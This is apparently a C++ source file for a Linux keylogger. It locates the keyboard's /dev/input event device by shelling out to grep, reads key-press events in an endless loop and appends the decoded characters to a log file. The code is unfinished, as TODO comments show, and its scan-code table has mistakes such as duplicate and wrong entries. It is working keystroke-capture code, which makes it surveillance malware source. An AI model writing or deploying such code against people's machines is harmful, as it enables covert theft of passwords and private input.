#include "Keylogger.h"

#include <array>
#include <memory>
#include <unordered_map>
#include <iostream>

// TODO: Finish lookup table 
const static std::unordered_map<short, std::string> lookup_table = {
    {41, "`"},
    {2, "1"},
    {3, "2"},
    {4, "3"},
    {5, "4"}, {6, "5"}, {7, "6"}, {8, "7"}, {9, "8"}, {10, "9"}, {11, "0"}, {12, "-"}, {13, "="}, {14, "[backspace]"},
    {1, "1"}, {15, "[tab]"}, {16, "q"}, {17, "w"}, {18, "e"}, {19, "r"}, {20, "t"}, {21, "y"}, {22, "u"}, {23, "i"}, {24, "o"},
    {25, "p"}, {26, "["}, {27, "]"}, {43, "\\"}, {29, "1"}, {30, "a"}, {31, "s"}, {32, "d"}, {33, "f"}, {34, "g"}, {35, "h"}, {36, "j"},
    {37, "k"}, {38, "l"}, {39, ";"}, {40, "'"}, {28, "[enter]"}, {42, "[shift]-"}, {44, "z"}, {45, "x"}, {46, "c"}, {47, "v"}, {48, "b"}, {49, "n"}, {50, "m"}, {51, ","},
    {52, "."}, {53, "/"}, {29, "[ctrl]"}, {125, "[windows]"}, {56, "[alt]"}, {57, " "}, {100, "[alt]"}, {126, "[windows]"}, {97, "[ctrl]"}
};

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result = "";
    // Creates a unique pointer that uses the pclose() function as a destructor
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    // error handling
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

Keylogger::Keylogger(std::string log_filename) {
    m_log_filename = log_filename;
    m_keyboard_path = get_keyboard_path();
    printf("Using %s as input device\n", m_keyboard_path.c_str());
    if ((m_keyboard_fd = open(m_keyboard_path.c_str(), O_RDONLY)) == -1) {
        perror("Invalid device link");
        exit(1);
    }
}

bool Keylogger::start_logging() {
    while (true) {
        read(m_keyboard_fd, &m_ev, sizeof(struct input_event));
        if (m_ev.type == EV_KEY && m_ev.value == 1) {
            process_keys();
        }
    }
}

void Keylogger::process_keys() {
    std::unique_ptr<FILE, decltype(&fclose)> logfile_ptr(fopen(m_log_filename.c_str(), "a+"), fclose);
    try {
        fprintf(logfile_ptr.get(), "%s", lookup_table.at(m_ev.code).c_str());
    } catch(const std::out_of_range& oor) {
        std::cerr << oor.what() << ": scan code not found\n";
    }
    
}
std::string Keylogger::get_keyboard_path() {
    // TODO: find a better way to do this
    std::string device_name = exec("grep -A 4 ^N.*[kK]eyboard /proc/bus/input/devices | grep -o event[0-9]");
    device_name.insert(0, "/dev/input/");
    device_name.erase(device_name.find('\n'));
    return device_name;
}



